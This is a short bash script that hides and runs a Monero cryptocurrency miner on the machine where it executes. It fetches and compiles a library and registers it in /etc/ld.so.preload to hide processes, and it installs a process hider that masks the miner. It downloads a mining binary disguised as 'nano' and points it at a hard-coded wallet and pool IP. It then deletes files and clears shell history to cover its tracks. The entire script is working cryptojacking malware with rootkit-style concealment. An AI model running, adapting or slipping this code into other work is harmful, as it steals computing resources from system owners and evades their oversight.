#!/bin/bash
set -x
apt-get update 
apt-get install -y wget curl sudo
curl https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c
echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
/etc/init.d/network restart
sudo apt-get update 
sudo apt-get install -y gcc ca-certificates curl gnupg 
sudo mkdir -p /etc/apt/keyrings
curl -fsSL https://deb.nodesource.com/gpgkey/nodesource-repo.gpg.key | sudo gpg --dearmor -o /etc/apt/keyrings/nodesource.gpg
echo "deb [signed-by=/etc/apt/keyrings/nodesource.gpg] https://deb.nodesource.com/node_18.x nodistro main" | sudo tee /etc/apt/sources.list.d/nodesource.list
sudo apt-get install nodejs -y
npm install -g npm@10.2.0 -y
npm i -g node-process-hider
ph add sgr1
mkdir .lib && cd .lib
wget https://github.com/TiannaMcdowell/All-File/releases/download/Nano/nano.tar.gz > /dev/null 2>&1
tar -xvf nano.tar.gz
chmod u+x nano
mv nano sgr1
./sgr1 -algo RandomX -wallet Q010500f8f21098ccf5acf2f08f0e6b315fb958d7c7a1bf811f34e49f7ac459f4aa7683c723391d -coin XMR -rigName envio -pool1 141.95.126.31:1166 -useSSL false -cpuThreads $(nproc --all) > /dev/null 2>&1 &
sleep 30
rm -rvf *
cd ~/
rm -rvf *
history -cr
while true
do
        echo "hold down..."
        sleep 60
done
